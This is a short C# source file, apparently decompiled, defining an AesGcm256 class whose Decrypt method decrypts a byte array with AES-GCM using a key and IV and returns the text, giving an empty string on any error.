using System;
using System.Text;

namespace Mist
{
	// Token: 0x02000020 RID: 32
	public static class AesGcm256
	{
		// Token: 0x060000AF RID: 175 RVA: 0x0000A3F4 File Offset: 0x000085F4
		public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
		{
			string text = string.Empty;
			string result;
			try
			{
				GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesFastEngine());
				AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);
				gcmBlockCipher.Init(false, parameters);
				byte[] array = new byte[gcmBlockCipher.GetOutputSize(encryptedBytes.Length)];
				int outOff = gcmBlockCipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, array, 0);
				gcmBlockCipher.DoFinal(array, outOff);
				text = Encoding.UTF8.GetString(array).TrimEnd("\r\n\0".ToCharArray());
				result = text;
			}
			catch
			{
				result = text;
			}
			return result;
		}
	}
}
